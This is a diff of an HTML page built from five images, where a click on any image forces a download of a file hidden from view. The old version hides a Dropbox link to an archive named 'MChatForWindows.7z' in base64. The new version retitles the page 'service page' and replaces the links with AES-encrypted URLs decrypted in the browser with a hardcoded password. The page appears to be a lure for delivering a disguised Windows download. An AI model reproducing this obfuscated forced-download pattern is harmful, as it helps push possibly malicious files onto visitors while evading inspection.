@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>社区</title>
+    <title>服务页面</title>
     <style>
         body, html {
             margin: 0;
@@ -13,32 +13,56 @@
             width: 100%;
             height: auto;
             display: block;
-            cursor: pointer; /* 鼠标指针样式 */
+            cursor: pointer; 
         }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
 
-    <img src="images/img_01.jpg"  onclick="downloadFile('aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzNyMHNvanh1ajY0b280dWNsY3l4ei9NQ2hhdEZvcldpbmRvd3MuN3o/cmxrZXk9MGI4azRsN3pxZTRqajJlM2hhNmRnNzltbyZzdD1rMXg0b2d2MiZkbD0x')">
-	 <img src="images/img_02.jpg"  onclick="downloadFile('aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzNyMHNvanh1ajY0b280dWNsY3l4ei9NQ2hhdEZvcldpbmRvd3MuN3o/cmxrZXk9MGI4azRsN3pxZTRqajJlM2hhNmRnNzltbyZzdD1rMXg0b2d2MiZkbD0x')">
- 	 <img src="images/img_03.jpg"  onclick="downloadFile('aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzNyMHNvanh1ajY0b280dWNsY3l4ei9NQ2hhdEZvcldpbmRvd3MuN3o/cmxrZXk9MGI4azRsN3pxZTRqajJlM2hhNmRnNzltbyZzdD1rMXg0b2d2MiZkbD0x')">
-	 <img src="images/img_04.jpg"  onclick="downloadFile('aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzNyMHNvanh1ajY0b280dWNsY3l4ei9NQ2hhdEZvcldpbmRvd3MuN3o/cmxrZXk9MGI4azRsN3pxZTRqajJlM2hhNmRnNzltbyZzdD1rMXg0b2d2MiZkbD0x')">
-	 <img src="images/img_05.jpg"  onclick="downloadFile('aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzNyMHNvanh1ajY0b280dWNsY3l4ei9NQ2hhdEZvcldpbmRvd3MuN3o/cmxrZXk9MGI4azRsN3pxZTRqajJlM2hhNmRnNzltbyZzdD1rMXg0b2d2MiZkbD0x')">	 
-	
+    <img src="images/img_01.jpg">
+    <img src="images/img_02.jpg">
+    <img src="images/img_03.jpg">
+    <img src="images/img_04.jpg">
+    <img src="images/img_05.jpg">
+
     <script>
-        function base64Decode(base64) {
-            return atob(base64); // 解码Base64字符串
+        const encryptedUrls = [
+            '', 
+            '', 
+            '', 
+            '', 
+            '',
+            '', 
+            ''  
+        ];
+
+        const passwords = '2233'; 
+
+        function decryptAES(encrypted) {
+            const decrypted = CryptoJS.AES.decrypt(encrypted, passwords);
+            return decrypted.toString(CryptoJS.enc.Utf8);
         }
 
-        function downloadFile(encodedUrl) {
-            const url = base64Decode(encodedUrl); // 解码链接
+        
+        function downloadFile(url) {
             const link = document.createElement('a');
             link.href = url;
-            link.download = ''; // 可选：指定文件下载时的名称
-            document.body.appendChild(link); // 将链接添加到文档中
-            link.click(); // 模拟点击链接
-            document.body.removeChild(link); // 下载后移除链接
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
         }
+
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encryptedUrl = encryptedUrls[index]; 
+                const decryptedUrl = decryptAES(encryptedUrl);
+                
+                downloadFile(decryptedUrl); 
+            });
+        });
     </script>
 
 </body>
